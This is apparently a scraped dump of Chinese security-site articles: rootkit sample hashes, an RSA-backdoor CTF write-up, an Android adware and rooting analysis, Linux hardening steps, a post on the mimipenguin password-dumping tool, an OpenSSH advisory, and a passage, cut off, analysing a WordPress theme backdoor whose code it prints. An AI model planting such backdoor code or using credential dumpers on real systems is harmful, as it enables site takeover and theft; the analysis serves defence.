25670f556ee4fd376164dcb43cf06ae1bad26dd5  TdxFlt_amd64.sys      ebe3aa18a2b62bfab7fb09b078f6f00c3f8525b1 “净广大师”病毒同源样本SHA1： 病毒名      SHA1  Rootkit/NetSec.a      03386c58c4d80522246a4e39e10f99fd31ec8a77  Rootkit/NetSec.a      03ac723bcf44a8315390a02cc2793b15e698d4aa  Rootkit/NetSec.a      03f0bedd48d7a6b4f0c13753148042f0b651e828  Rootkit/NetSec.a      047a841a77a21adc21d36050d6f6ef6113f3c824  Rootkit/NetSec.a      09fbef91d17b722a1fa5abcd26e5e8fe7d783cdc  Rootkit/NetSec.a      0a350ca15112db2aae421c38579485f478e6b13a  Rootkit/NetSec.a      0aa4a878867a572c9ef4944a55f6e1bada1dddf5  Rootkit/NetSec.a      0c8c66abc446ad15cdd2a9ac24f5d5fae74072cf  Rootkit/NetSec.a      11b0047f26a4f54e5e0268a6d8bd2fa386b3b482  Rootkit/NetSec.a      12a2b07c1a2588fc0faf42c70cdc0d8b1d21ce51  Rootkit/NetSec.a      143e5e6c00d511b1178ddbc08877c531c296e0f2  Rootkit/NetSec.a      1573ccdd3784691f0c17eda6027da5ce123841b2  Rootkit/NetSec.a      1868141e109d391fc34d8f586ae02b916cae4644  Rootkit/NetSec.a      1de1300423b05c206b5062a9003e56951479e198  Rootkit/NetSec.a      1def02236c71777d1fefcf6cdfcde1e322b763d0  Rootkit/NetSec.a      243494bbac4b50587cc7d227b9f6a03c0343893a  Rootkit/NetSec.a      248884105ea5291972ad6c6e8a75941b59c3334a  Rootkit/NetSec.a      26319f416b0416ba48c828115d369f1efa64b8f9  Rootkit/NetSec.a      27b459c686b0a40bd12ba8ed1316e3126eb9e9d2  Rootkit/NetSec.a      27d8512fd7da189f649eff2cd0274a406405620b  Rootkit/NetSec.a      289ad9787b6b06ab46007e46e4b7954e0d8a476c  Rootkit/NetSec.a      2e1c56b39b6db506a53a05c4ee8270ec48257e33  Rootkit/NetSec.a      2f5a9fc32567140253bf49153b22cf5c868ed06e  Rootkit/NetSec.a      3470f3b06f387bb7bb55459c0786f6ed512e926d  Rogue/NetSec.gen      0a1655d06ed5a6550b495df627cd76bd0ab046ff  Rogue/NetSec.gen      0c9226676127709d032cff8c695c14abba49c3cf  Rogue/NetSec.gen      177f5703f4ba8c146e955b5bdfe6860d4cb4f7f1  Rogue/NetSec.gen      1fb098637af04af4b7f7cd4bf3521d8d0d1f716c  Rogue/NetSec.gen      25670f556ee4fd376164dcb43cf06ae1bad26dd5  Rogue/NetSec.gen      25822c34eabe5c1a0d1051a1836f5b50196c7f08  Rogue/NetSec.gen","2016-12-24 16:18:50","Web安全","“净广大师”病毒HTTPS劫持技术深度分析","http://nsoad.com/Article/web/20161224/935.html"
"5ccbf9df4f2f0a0a7a69bfda","今年犯懒了所以只出了3题RSA的密码学题目, 出题思路来源于协会上一届的学长 @Mystery Of Panda 关于RSA后门的毕业设计.","kong","今年犯懒了所以只出了3题RSA的密码学题目, 出题思路来源于协会上一届的学长 @Mystery Of Panda 关于RSA后门的毕业设计.Crypto So Interesting题目: https://github.com/Hcamael/ctf-library/tree/master/RSA1payload: https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py出题时预测的分数在300分左右, 不过看完选手的wp后发现这题出现了重大失误, 现在来看, 这题只值150分左右, 但是实际情况只有23个队解出了该题.本题思路来源: 基于隐藏指数的RSA-HSDβ算法, 全称为隐藏小私有指数δ的RSA后门密钥生成算法.该算法依赖于wiener小指数攻击方法后门生成流程:其中β是在2^(k-1) ± 2^(k/2)范围内的素数, 转置函数的作用是在β非常大的情况下, 返回值可以认为是PRP(Pseudo-Random Permutation). 转置函数可以有好几种形式, 我选取的是一种比较简单的转置函数.从上面的流程可以看出这题非常的简单, 要逆向也是很容易的, 所以该题为本届HCTF密码学的签到题逆向思路:从上图可以看出本题只涉及到了wiener算法, 难度差不多是150左右出题时本来是准备考两种算法的, 一种是wiener算法, 一种是Riemann's hypothesis and tests for primality, payload中的divide_pq函数, 已知e, d, n质因数分解p和q(http://www.di-mgt.com.au/rsa_factorize_n.html)原本设计着算出(ϵ, δ)后, 根据(ϵ, δ, n)分解出q和p, 但是出题失误, 导致只需要wiener算法就能getflagPS1: 不过还是出现了非预期, ROIS的dalao利用wiener算法分解出p和q, https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa_s.pyPS2: 基于隐藏指数的RSA后门生成算法除了本题涉及的还有RSA-HSPEβ和RSA-HSEβCrypto So Cool题目: https://github.com/Hcamael/ctf-library/tree/master/RSA2 payload:https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.pyhttps://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage出题时预测的分数在400分左右, 实际情况只有7个队解出了该题. 和预测差不多, 最后放了一波hint, 要不然可能会更少.本题思路来源: 基于隐藏素数因子的RSA-HPβ算法该后门算法依赖于Coppersmith partial information attack算法, sage实现该算法后门生成流程: 该算法的核心在于把p的前半部分比特隐写到n中τ的长度为k/16比特μ的长度为5k/16比特λ的长度为5k/8比特所以n的长度为k比特p * (q xor random(k/8比特长度))的前3k/8比特的值是不变的所以可以成功把τ, μ隐写到n中逆向思路:该题的难点主要在于Coppersmith partial information attack算法, 能在放hint前做出的队伍都是在github上找到了该算法的脚本 https://github.com/Gao-Chuan/RSA-and-LLL-attacksCrypto So Amazing题目: https://github.com/Hcamael/ctf-library/tree/master/RSA3payload:https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3_payload.pyhttps://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3.sage出题时预测的分数在450分左右, 不过却没有能做出来, 我知道的几个队都是被上一题的脚本给坑了本题思路来源: 基于有限域F(2^m)上椭圆曲线的RSA后门生成算法流程图懒得画了, 上一题的后门算法看懂了, 这题去看代码也不难, 主要是通过Diffie–Hellman key exchange算法生成私钥作为种子生成伪随机数, 私钥很好求, 本题的难点跟上题一样同样在于Coppersmith partial information attack算法上一题我故意改简单了, 已知p的前640比特, 所以可以很容易通过https://github.com/Gao-Chuan/RSA-and-LLL-attacks这个脚本恢复出完整的p但是这题已知p的前576bit, github上的那个脚本就跑不出来了这部分是出题时无意间挖出的坑, 因为我并不知道github上的这个脚本, 在我预想中能做出rsa2的基本都是能做出rsa3的这题还有一个坑点sage和python 用相同的seed生成的随机数不一样, 所以在payload中我使用了python生成随机数总结本届HCTF的Crypto计划的考点是Coppersmith partial information attack算法和Riemann's hypothesis and tests for primality算法, 不过无奈由于出题失误第二个算法没考成","2016-11-30 12:34:37","CTF专题","2016 HCTF Crypto 出题总结","http://nsoad.com/Article/CTF/20161130/874.html"
"5ccbf9df4f2f0a0a7a69bfdb","魔波广告恶意病毒通过仿冒浏览器，播放器和一些游戏等进行传播，一旦用户手机不慎被感染，该病毒将立即下载提权文件来获取 root权限，频繁推送广告，监控用户短信记录，私自发送扣费短信，注入大量恶意文件","kong","1.病毒介绍魔波广告恶意病毒通过仿冒浏览器，播放器和一些游戏等进行传播，一旦用户手机不慎被感染，该病毒将立即下载提权文件来获取 root权限，频繁推送广告，监控用户短信记录，私自发送扣费短信，注入大量恶意文件到手机系统用于守护病毒，防止病毒被卸载。病毒样本的下载来源大多是来自国外的云服务器如cloudfront.net和amazonaws.com ，软件名通常为全英文如WatermelonShare、CalcMaster等，推送的广告内容以及下载的软件也都是国外软件，以此推测此病毒的目标应该是国外用户；从病毒功能及代码注释信息上看， 此病毒是国内制造的，因此推测此病毒是国内制造，国外流行的典型广告木马 ，我们根据感染量较大的一个样本中的一些线索推测木马作 者可能是在福建福州，一家从事app市场的公司。病毒感染量变化趋势：2.样本信息包名:com.mobo.mrclean证书:1D90BFFEC2A26B6CC50151757CBCEE04Assets目录下的子包3.恶意行为1)病毒运行后，立即下载提权文件来获取root权限，夺取系统的控制权；2)注入大量恶意文件到手机系统，阻止病毒被卸载；4)下载并静默安装恶意子包至手机rom内 ； 5)频繁推送恶意广告，影响用户正常使用手机；4.病毒执行流程5.详细分析1)病毒母包行为加载子包assets/a调用in1方法解码assets/c，assets/s，生成mcr.apk和libdt.so调用in2方法加载libdt.solibdt.so中通过in3方法了mcr.apklibdt.so的in4方法通过loadClass方式调用了mcr.apk的com.android.provider.power.Power类中的init方法com.android.provider.power.Power类中的init方法initcore方法中通过getIsFirst方法判断程序是否第一次被运行若是首次运行则调用Door.init(context);方法初始化配置并启动服务b和服务d，激活广告功能服务b，启动线程DetectAppTask并通过timerSet定时持续发送广播检测包名通过之后，线程DetectAppTask发送弹窗广播Action”com.fpt.alk.clk”广播接收器通过接收广播弹出广告服务d启动诱导消费模块通过startservice方式启动服务c启动计费服务，创建线程GasLogicRun启动线程GasLogicRun，调用handlerRet方法发送短信handlerRet方法解析JSONObject获取相关的计费信息并发送短信进行扣费拦截含有指定关键字的短信扣费成功后向服务器上传信息DataStore类用于操作存放屏蔽关键词的数据库fmoonStore.dbCpsavd类用于监控短信变化2)Root相关模块Root启动模块子包com.xx.mas.demo，判断root方案文件是否存在，若存在则加载进行root，若不存在则创建生成再进行root/data/data/包名/files/.sunny目录下的b.png解压后为r1~r4，分别是四种root方案，利用了CVE-2012-6442、WooYun-2013-21778、CVE-2013-6282等漏洞来进行root提权。3)其他恶意文件功能简要说明elf文件.ukd，注入恶意文件至手机系统中如下注入恶意文件到/system/xbin/.pr.ioElf文件.pr.io用于守护包名为com.music.store.fore.go的恶意apk并与服务器交互信息elf文件.pe用于保护root权限；elf文件supolicy用于在init.rc和install-recovery.sh中添加恶意文件开机启动修改后的install-recovery.shmkdevsh文件将恶意文件注入系统中并修改权限.debuggerd.no注入恶意文件至系统中并设置守护线程.ir文件用于设置守护线程4)rom恶意apk子包分析用户量情况B90A7FCB2019BB59799646F77746FAEF11EECE37启动后加载资源子包\assets\is.png，主要用于广告的统计与服务器的交互，也有私自下载静默安装的风险29E9B1F1285D73612C751ACF3D755A99B31F3509EF28DE725D2AF36E7BE5E063ADF6D1DF358AE95D32486B0757215FC94684D85762C836007A6811D0E6E87065821C5FDEC3F5C1CF6C2A1736B0AC1B8BA715A1A36DF454C2DCC242D5884DF40150670574 启动后解密并加载资源子包\res\raw\protect.apk，用于唤醒病毒主模块进程，并私自下载安装其他软件私自下载安装其他软件5)样本相关链接：推广信息图片：http://d3********iyhtno.cloudfront.net/pic/pic1.jpgRoot模块：http://down.c*****xa.com/b****okr/rtt_0310_577.apkhttp://down.c******xa.com/testapk/is1010_1154.jarRom内恶意子包netalpha：http://down.co****n.com/o****in/mains2.apk6)查杀截图 7)清除方案要将此病毒彻底清除需要清理系统中的恶意文件：","2016-11-20 23:59:17","系统安全","魔波广告恶意病毒简析","http://nsoad.com/Article/system/20161120/821.html"
"5ccbf9e04f2f0a0a7a69bfdc","可能大多数人都觉得Linux是安全的吧？但我要告诉你，这种想法绝对是错误的！","kong","可能大多数人都觉得Linux是安全的吧？但我要告诉你，这种想法绝对是错误的！假设你的笔记本电脑在没有增强安全保护的情况下被盗了，小偷首先就会尝试用“root”（用户名）和“toor”（密码）来登录你的电脑，因为这是KaliLinux的默认用户名和密码，而大多数人仍然会继续使用它们。你是否也是这样？我希望你不是！在这篇文章中，我将会与大家分享一些能够让你的Linux主机更加安全的方法，其中还会包括一些渗透测试技巧。需要注意的是，目前市面上有很多不同的Linux发行版，从命令行工具的角度来看，这些版本虽然各有不同，但原理和处理逻辑是一样的。接下来，让我们开始吧！1-记录主机信息每当你在对一台新的Linux主机进行安全增强工作时，你需要创建一个文档并在文档中记录下本文所列出的各种项目，而且在工作完成之后，你还要对这些项目进行核查。除此之外，在文档的开头处，你需要记录下这台Linux主机的相关信息：设备名称IP地址Mac地址进行安全增强工作的负责人（其实就是你）日期资产编号（如果你在为一家企业工作，那么你就需要记录下这台设备的资产编号）2-BIOS保护你需要为这台主机的BIOS设置一个密码，以确保终端用户无法修改或覆盖BIOS中的安全设置，这是非常重要的！BIOS的管理员密码设置完成之后，你需要禁止主机从外部媒体设备（USB/CD/DVD）启动。如果你忽略了这项设置，那么任何人都可以通过一个写入了启动镜像的U盘来访问这台主机中的数据。在新版服务器的主板中内置有一个Web服务器，你可以利用它来远程访问主机中的数据。所以你要确保已经修改了服务器管理页面的默认密码，如果可以的话，请直接禁用这个功能。3-硬盘加密（机密性）大多数Linux发行版在进行安装之前，都允许你对磁盘进行加密。磁盘加密是非常重要的，因为当你的计算机被盗之后，就算小偷将你的硬盘插入他们自己的计算机中也仍然无法读取你的数据。在下图中，选择列表中的第三个选项：Guided-use entire disk and set up encrypted LVM（LVM代表逻辑卷管理器）。如果你的Linux发行版不支持加密的话，你可以选择使用类似TrueCrypt这样的加密软件。4-磁盘保护（可用性）数据备份是一个很好的习惯，当系统发生崩溃或系统更新出现故障时，备份的优点就突显出来了。对于某些重要的服务器来说，为了防止灾难（包括自然灾害和人为因素）带来的影响，备份数据通常需要进行离线存储。当然了，备份也需要我们花精力去管理。比如说，旧的备份文件需要保存多久？何时需要对系统进行备份？（每天？每周？还是每月？）核心系统的磁盘需要进行多个分区：//boot/usr/home/tmp/var/opt磁盘分区可以在系统发生故障的情况下依然保障系统的性能和安全性。在下图中，你可以看到Kali Linux在安装的过程中所提供的分区选项。5-锁定boot目录boot目录中包含大量的重要文件，这些文件与Linux内核有关，所以你需要通过下列步骤来确保这个目录只开放了“只读”权限。首先，打开“fstab”文件。接下来，将下图所示的最后一行数据添加进去。这一步完成之后，你需要执行下列命令来设置该文件的拥有者：#chown root:root /etc/fstab接下来还需要设置一些权限来保护启动设置：-设置/etc/grub.conf的拥有者（owner）和组（group）为root用户：#chown root:root /etc/grub.conf-设置/etc/grub.conf文件只有root可读写：#chmod og-rwx /etc/grub.conf-单用户模式需要进行身份验证：#sed -i ""/SINGLE/s/sushell/sulogin/""/etc/sysconfig/init#sed -i ""/PROMPT/s/yes/no/"" /etc/sysconfig/init6-禁用USB存储设备根据你系统的重要程度，有时你需要禁止Linux主机使用USB存储设备。现在有很多种方法可以禁用USB存储设备，下面给大家提供的是最常用的一种：用你最喜欢的文本编辑器打开“blacklist.conf”文件：#nano /etc/modprobe.d/blacklist.conf打开文件之后，将下列信息添加到文件底部，然后保存并退出：blacklist usb_storage然后打开rc.local文件: #nano /etc/rc.local添加下面这两行数据： modprobe -r usb_storageexit 07-系统更新首次启动之后，第一件事就是更新系统，这一步应该算比较简单了。通常情况下，你可以打开终端，然后执行相应的命令即可。在Kali Linux中，你可以使用下图所示的命令进行系统更新：8-检查已安装的package列出你Linux系统中所有已安装的package，然后删除那些你不需要的。如果你正在操作的是一台服务器的话，那么你就要非常仔细了，因为服务器中一般只用安装必须使用的应用程序和服务。你可以通过下图所示的命令列出Kali Linux中安装的package：请记住，禁用那些你不需要的服务可以降低服务器的攻击面。如果你在自己的Linux服务器中发现了下面这些遗留服务的话，请赶紧删除它们：Telnet serverRSH serverNIS serverTFTP serverTALK server9-检查开放端口识别面向互联网的开放连接是一项非常重要的任务。在Kali Linux中，我们可以使用下图所示的命令来发现隐藏的开放端口：10-增强SSH的安全性没错，SSH确实是安全的，但是我们仍然要在现有的基础上继续增强它的安全性。首先，如果你可以禁用SSH的话，那么问题就解决了。但是，如果你仍然需要使用它，那么你就需要修改SSH的默认配置了。切换到目录/etc/ssh，然后打开“sshd_config”文件。-将默认端口号（22）修改为其他的数字（例如99）。-确保root用户无法通过SSH进行远程登录：PermitRootLogin no-允许某些特殊的用户：AllowUsers [username]如果你需要进行更加丰富的配置，请确保在阅读了SSH手册并了解文件中全部配置项的情况下进行操作。【参考资料】除此之外，你还需要确保在“sshd_config”文件中配置下面这些额外的配置选项：Protocol2IgnoreRhosts to yesHostbasedAuthentication noPermitEmptyPasswords noX11Forwarding noMaxAuthTries 5Ciphers aes128-ctr,aes192-ctr,aes256-ctrClientAliveInterval 900ClientAliveCountMax 0UsePAM yes最后，设置该文件的访问权限，确保只有root用户可以修改该文件的内容：#chown root:root etc/ssh/sshd_config#chmod 600 /etc/ssh/sshd_config11-启用SELinuxSELinux是一种支持访问控制安全策略的内核安全机制。SELinux有三种配置模式：Disabled: Turned-offPermissive: Prints warningsEnforcing: Policy is enforced打开配置文件：#nano /etc/selinux/config确保SELinux已开启：SELINUX=enforcing12-网络参数保护Linux主机的网络活动同样是非常重要的，永远不要指望着防火墙去帮你完成所有的任务。打开/etc/sysctl.conf文件，然后进行下列设置：-将net.ipv4.ip_forward参数设为0。-将net.ipv4.conf.all.send_redirects和net.ipv4.conf.default.send_redirects参数设为0。-将net.ipv4.conf.all.accept_redirects和net.ipv4.conf.default.accept_redirects参数设为0。-将net.ipv4.icmp_ignore_bogus_error_responses参数设为1。13-密码策略人们通常会在不同的地方使用相同的密码，这是一个非常不好的习惯。旧的密码保存在/etc/security/opasswd文件中，我们需要使用PAM模块来管理Linux主机中的安全策略。在Debian发行版中，可以打开/etc/pam.d/common-password文件，然后将下面的信息添加进去，这样就可以防止用户重新使用最近曾使用过的四个密码了：auth      sufficient   pam_unix.so likeauthnullokpassword             sufficient               pam_unix.so remember=4另外一个密码策略就是强迫用户使用健壮的密码。PAM模块提供了一个库（pam_cracklib），它可以帮助你的服务器抵御字典攻击和爆破攻击。打开/etc/pam.d/system-auth文件，然后将下列信息添加进去：/lib/security/$ISA/pam_cracklib.so retry=3 minlen=8lcredit=-1 ucredit=-2 dcredit=-2 ocredit=-1Linux保存的是密码的哈希，所以你要确保系统使用的是SHA512哈希算法。另外一个有趣的功能就是“密码输出错误五次之后锁定账号”。打开/etc/pam.d/password-auth文件，然后添加下列数据：auth required pam_env.soauth required pam_faillock.so preauth audit silent deny=5unlock_time=604800auth [success=1 default=bad] pam_unix.soauth [default=die] pam_faillock.so authfail audit deny=5unlock_time=604800auth sufficient pam_faillock.so authsucc audit deny=5unlock_time=604800auth required pam_deny.so然后打开/etc/pam.d/system-auth文件，再添加下列信息：auth required pam_env.soauth required pam_faillock.so preauth audit silent deny=5 unlock_time=604800auth [success=1 default=bad] pam_unix.soauth [default=die] pam_faillock.so authfail audit deny=5unlock_time=604800auth sufficient pam_faillock.so authsucc audit deny=5unlock_time=604800auth required pam_deny.so密码输错五次之后，只有管理员才可以解锁这个账号，解锁命令如下：# /usr/sbin/faillock --user  --reset另一个好习惯就是设置“密码九十天后过期”。-将/etc/login.defs中的PASS_MAX_DAYS参数设为90。-修改当前用户的密码过期时间：#chage --maxdays 90 现在，我们还要限制su命令的访问权。打开/etc/pam.d/su文件，然后设置pam_wheel.so参数：auth required pam_wheel.so use_uid最后一步就是禁止非root用户访问系统账号。这一步可以通过下面这个bash脚本完成：#!/bin/bashfor user in `awk -F: '($3 &lt; 500) {print $1 }'/etc/passwd`; doif [ $user != ""root"" ]then/usr/sbin/usermod -L $userif [ $user != ""sync"" ] &amp;&amp; [ $user !=""shutdown"" ] &amp;&amp; [ $user != ""halt"" ]then /usr/sbin/usermod -s /sbin/nologin $userfifidone14-权限和验证毫无疑问，如果你想要保证Linux主机的安全性，权限肯定是最重要的东西。通过下列命令设置/etc/anacrontab、/etc/crontab和/etc/cron.*的相应权限：#chown root:root /etc/anacrontab#chmod og-rwx /etc/anacrontab#chown root:root /etc/crontab#chmod og-rwx /etc/crontab#chown root:root /etc/cron.hourly#chmod og-rwx /etc/cron.hourly#chown root:root /etc/cron.daily#chmod og-rwx /etc/cron.daily#chown root:root /etc/cron.weekly#chmod og-rwx /etc/cron.weekly#chown root:root /etc/cron.monthly#chmod og-rwx /etc/cron.monthly#chown root:root /etc/cron.d#chmod og-rwx /etc/cron.d为/var/spool/cron分配适当的权限：#chown root:root#chmod og-rwx 为“passwd”、“group”、“shadow”和“gshadow”文件分配适当的权限：#chmod 644 /etc/passwd#chown root:root /etc/passwd#chmod 644 /etc/group#chown root:root /etc/group#chmod 600 /etc/shadow#chown root:root /etc/shadow#chmod 600 /etc/gshadow#chown root:root /etc/gshadow15-额外的操作除了上述配置之外，下面这些因素也应该纳入我们的考虑范围内。第一：-在/etc/security/limits.conf文件中添加“hardcore 0”；-在/etc/sysctl.conf文件中添加“fs.suid_dumpable= 0”；第二：-在/etc/sysctl.conf文件中添加“kernel.exec-shield= 1”第三：-在/etc/sysctl.conf文件中添加“kernel.randomize_va_space= 2”；结束语在这篇文章中，我给大家介绍了几个能够增强Linux系统安全性的重要配置。但是，这只是冰山一角，还有很多复杂且有效的设置项还没来得及与大家分享。如果你还想了解更多关于增强Linux安全性的内容，请参考我在Pluralsight上的课程【传送门】。","2016-12-01 23:36:39","系统安全","Linux强化论：15步打造一个安全的Linux服务器","http://nsoad.com/Article/system/20161201/876.html"
"5ccbf9e04f2f0a0a7a69bfdd","只要借用一下电脑，便可轻松拿到密码……“女神，借用电脑一看可否？”","zusheng","只要借用一下电脑，便可轻松拿到密码……“女神，借用电脑一看可否？”前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。项目地址https://github.com/huntergregal/mimipenguin使用实例需求：ROOT权限以下环境测试通过Kali 4.3.0 (rolling) x64 (gdm3)Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)VSFTPd 3.0.3-8+b1 (Active FTP client connections)Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions)openssh-server 1:7.3p1-1 (Active SSH connections sudo usage)","2017-04-06 14:07:24","安全工具","Linux下密码抓取神器mimipenguin发布","http://nsoad.com/Security-tools/20170406/tools-1128.html"
"5ccbf9e04f2f0a0a7a69bfde","漏洞出现ssh-agent中，这个进程默认不启动、只在多主机间免密码登录时才会用到","kong","漏洞编号CVE-2016-10009漏洞等级中危漏洞影响OpenSSH 7.3及以下版本漏洞描述漏洞出现ssh-agent中，这个进程默认不启动、只在多主机间免密码登录时才会用到。sshd 服务器可以利用转发的 agent-socket 文件欺骗本机的 ssh-agent 在受信任的白名单路径以外加载一个恶意 PKCS#11 模块，任意执行代码。换句话说，是恶意服务器在客户端的机器上远程执行代码。这个漏洞的利用条件是比较严苛的，要求攻击者控制转发agent-socket，而且需要有主机文件系统写权限。所以官方把该漏洞等级评为中危。基于OpenSSH庞大的用户量，可能有少部分主机会受此影响。漏洞修复实际上仅允许加载受信任白名单的模块，即可解决问题。OpenSSH官方已于12月19日发布7.4版本的OpenSSH，修复了包括CVE-2016-10009在内的多个漏洞。Ubuntu、Debian等平台也已经更新了程序。请大家及时到最新版本。","2016-12-22","漏洞发布","OpenSSH现中危漏洞，可致远程代码执行","http://nsoad.com/Article/exploit/20161222/vulzone-45.html"
"5ccbf9e94f2f0a0a7a69bfdf","我们的网络安全生态系统需要：简化！这是安全的根本性挑战","clouds","前，全球网络安全形势错综复杂，甚至难以管控。究其原因，一方面在于各种高级网络攻击活动持续增多，从本质上打破了安全平衡；另一方面在于，让人眼花缭乱的各类安全产品应运而生，然而，这些安全产品虽各具功能特色，但也容易陷入“安全孤岛”，从总体上限制了安全效应发挥。举例来说，假如一个机构，为安全投资部署了至少35种不同技术和上百种安全设备，然而由于这些技术设备使用的协议和运行模式不同，其最终结果可能是，构建了一堆“笨拙、反应迟钝”的安全设施平台，达不到建造安全、发挥安全的目的。相反，这种情况，可能还会被攻击者利用。这种“越多越好”的观点迫使安全团队监控管理那堆乱糟糟的设备，一旦遇到安全威胁，还需投入大量精力在混乱的防护警报中寻找关联信息，相当麻烦。即使对那些大型或有经验的安全团队来说，这也是一项艰巨而繁杂的任务。我们的网络安全生态系统需要：简化！这是安全的根本性挑战，以至于在行业内早已是不再谈论的话题。而简化真正需要的是“安全抽象”的核心内含。在我们之前的专栏文章中提到，“抽象”方法曾被成功用于解决，当系统达到一定体量和复杂度时面临的情况。安全抽象方法的概念安全抽象的含义是使复杂的安全模型简单化，其目标是使用一种通俗语言，根据安全角色优缺点定义方法，把网络安全生态系统划分为相关的抽象组件，这样我们就能从复杂的安全模型中得到简单的安全视角。安全抽象方法的意义安全抽象方法的前提需要深入领会每种安全角色能力（安全颗粒），其目的在于，当相应的有针对性的攻击发生时，能够快速了解安全事件，从中发现威胁产生的实质。安全抽象法能够快速识别安全事件，让组织机构能充分部署相应的最佳安全防护策略去解决威胁。当处理真实威胁时，这种抽象过程可以做到精心调配，反应及时准确。有些人可能觉得这不可能。当然，这是一个巨大的挑战，但并非不可能，因为在过去几年，一些重大技术改变正悄然发生：API：基于重要客户和供应商需求的API设计发展比以往更具预测性和稳定性。SDDC&amp;NFV ：客户对“开放性”和“可编程性”的需求，促进底层网络技术的整合、定制和自动化，使其更加适合他们的自身业务需求。AI：人工智能技术的进步发展显著，特别是机器学习技术可以实现分类算法的人为认知理解。所有这些技术都是安全抽象方法成为现实操作的基础。复杂安全模型的抽象化包含两层意思：按照不同的检测、侦查、缓解或修复能力对安全设备进行分析分类，这是一个持续的过程，因为安全产品的持续更新将会产生新的安全数据和能力（例如每周的入侵攻击数据库更新、恶意软件哈希值更新等）。通过海量的日志文件分析和安全目标分类，把威胁抽象化。机器学习机器学习技术着力解决，在学习过程中，如何分配一个新的数据点到一个数据集群的问题。在网络安全问题中，这些数据点可以想像为IDS/IPS数据库中的攻击签名，恶意软件名称、特征、哈希，或安全规则等，而数据集群则代表不同的安全目标。各种集群都有不同的安全含义（威胁意图或防护目标）。该过程如下图所示：根据上面的说明，很明显，通过分析了解安全日志（右边的威胁数据集群），可以非常容易地关联出相应的最佳安全防护策略或能力（左边的防护数据集群）。以下是一个把攻击日志和安全意图（安全颗粒）中的安全功能进行分类的具体例子，其中包括了选择分类好的威胁数据点，以及对应的威胁结果项：机器学习在创建抽象视图中起着重要作用。在同一硬币的两面中，安全功能和威胁本身如影随形，而机器学习能有助于创建一个直观的自适应安全分类，从而提高海量安全数据的分析能力。同时，机器学习的即时数据关联性也将大大简化攻击事件的调查难度，并最终匹配出相应的最佳安全应对策略。机器学习分类算法的价值超越单纯聚类行为，这些算法可以工作在任何数据源点和组成的安全事件集群中，例如，在不需要知道具体功能的前提下，为那些底层的安全产品划分安全能力意图。这意味着，创建的安全分类可以被认为是一个抽象层，并适用于任何大中型组织的现有安全配置。无论哪个种类型的安全厂商或组织使用，都能提供所需的明确分类。抽象在很多实例中已经被证明是一个非常成功的概念，应该得到安全行业的更多采用和关注。TCP/IP的OSI通信模型、智能手机的APP平台（如iOS）和网页设计平台都是抽象模型的典范。总结在网络安全领域，安全抽象方法可以创造根本性的改变，能简单及时地应用于大量威胁识别、调查和缓解过程。安全抽象的清晰表述可以帮助组织机构有效识别每种安全攻击事件的类型和起源，并匹配出最佳可用的安全对策。在这方面，一些相关的安全资源已经成型，我们要做的就是，学习并有效整合应用它们。","2017-01-17 14:06:18","安全管理","安全抽象：网络安全生态系统从复杂臃肿到有效自动化的发展之道","http://nsoad.com/news/securityissue/20170117/1026.html"
"5ccbf9e94f2f0a0a7a69bfe0","上周公司小伙伴给了我一个Wordpress主题让我帮忙审核，漏洞没有发现，但是却发现了这样一个后门：","kong","0x00 概述上周公司小伙伴给了我一个Wordpress主题让我帮忙审核，漏洞没有发现，但是却发现了这样一个后门：当启用这个主题后，攻击者即可通过该后门远程无需密码以管理员权限登录到网站的后台中。这个后门可谓“年代久远”，早在2010年就在国外被提出来了（http://harmonyinfotech.in/cms/wordpress-cms/wordpress-virus-function-checkisactive_widgets/），然而令人遗憾的是时间过了这么久依然还有很多主题存在这个后门，更令人惊讶的是一些提供主题下载的网站也存在该后门，如果被人加以利用后果不堪设想。0x01 详细分析我们的样本是从某网站花86块购买的（没错，付费主题也存在问题），正常审计过程中会搜索代码中使用的敏感函数，当搜索call_user_func_array函数的时候发现了两处奇怪的用法：functions.php第257行：$sq1=""..."". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) . ""..."";这里省略了不必要的部分。可以看到作者将call_user_func_array的结果拼接到sql语句中，当时只是好奇为什么这样写，然而将这段代码放到搜索引擎中却发现了意外的结果：http://ihacklog.com/post/wordpress-theme-malicious-code-analysis.html，可以看到这正是里面所描述的恶意代码。根据文中的叙述，这段恶意代码的作用是：启用后主题后每当有人访问网站就检查网站中的所有主题是否已被感染，然后感染未被感染的主题，随后将网站url发送到 livethemes@gmail.com 这个邮箱中将文中的代码和本地的文件做一下对比（仅截取一部分）：发现只是在变量名上做了调整，然后在启用主题时进行动态调试，发现确实存在上文所说的向livethemes@gmail.com发送邮件的行为：现在我们可以确定这个主题是存在问题的，但仅仅是向livethemes@gmail.com发送我们网站url这么简单吗？我们再来看下一处call_user_func_array调用：functions.php第306-310行：if ($use_link ) {      if($forces_more) {        $output .= ""..."" . $more_links_text = !is_user_logged_in() &amp;&amp; @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : ""..."";    } else {        $output .= ""..."";    }}当$use_link和$forces_more值为真时，调用call_user_func_array($checkwidgets,array($perpage, true))，我们来看一下相关变量的值：if(!isset($method)) $method=""cookie"";  if(!isset($filter_p)) $filter_p=""wp_"";  if(!isset($use_link)) $use_link=1;  if(!isset($perpage)) $perpage=$_GET[""cperpage""];  if(!isset($authname)) $authname=""auth"";  if(!isset($checkwidgets)) $checkwidgets=$filter_p.""set"".""_"".$authname.""_"".$method;  if(!isset($forces_more)) $forces_more=1;  可以看到$use_link和$force_more的值均为1，$checkwidgets值为wp_set_auth_cookie，所以这段函数可以精简为：call_user_func_array('wp_set_auth_cookie', array($_GET['cperpage'], 